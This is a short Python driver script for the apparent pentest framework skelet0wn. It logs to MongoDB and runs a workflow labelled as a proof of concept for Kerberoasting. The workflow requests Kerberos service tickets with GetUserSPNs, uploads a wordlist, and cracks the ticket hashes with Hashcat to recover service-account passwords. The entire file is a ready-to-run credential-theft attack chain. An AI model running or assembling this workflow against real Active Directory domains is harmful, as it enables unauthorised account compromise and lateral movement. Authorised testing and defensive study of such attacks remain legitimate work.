import os
import time
from typing import Optional

from loguru import logger
from pymongo import MongoClient
from pymongo.results import InsertOneResult

from skelet0wn.limbs.bones import GetUserSPNs, Hashcat
from skelet0wn.limbs.joints import ShareFile, Sequence, Transformer, UploadFile
from skelet0wn.utilities import logger_setup

logger_setup()
logger.info("########## Database setup")

# Connect to MongoDB
logger.info("* Connecting to client")
client: MongoClient = MongoClient("mongodb://localhost:27017/")

# Set unique runID
run_id = time.strftime("%Y%m%d-%H%M%S")

# if no database was specified, create a new one
database_name = os.getenv("DATABASE_NAME")
if database_name is None:
    database_name = time.strftime("%Y%m%d-%H%M%S")
    logger.info(f"  * Creating new database {database_name}... ")
else:
    logger.info(f"  * Using existing database {database_name}... ")
mongo_database = client[database_name]

# Define workflow and build Docker images
logger.info("########## Building workflow")

# POC - Kerberoast/Hashcat
initialID = None
workflow = Sequence(
    children=[
        GetUserSPNs("./Kerberoast/mappingGUS.yml"),
        UploadFile("./Kerberoast/my_word_list.txt", "wordlist.txt"),
        ShareFile("wordlist.txt"),
        ShareFile("tgs.txt"),
        Hashcat("./Kerberoast/mappingHashcat.yml"),
    ]
)

# Set names and create outputs folders
logger.info("* Setting names and creating output folders")
workflow.prepare_environment(
    output_dir=os.getcwd() + "/outputs", shared_dir=os.getcwd() + "/outputs/shared"
)
# Exec
logger.info("########## Running workflow")

try:
    workflow.run(mongo_database, run_id)
except Exception as exc:
    logger.info(f"Exception {exc}")
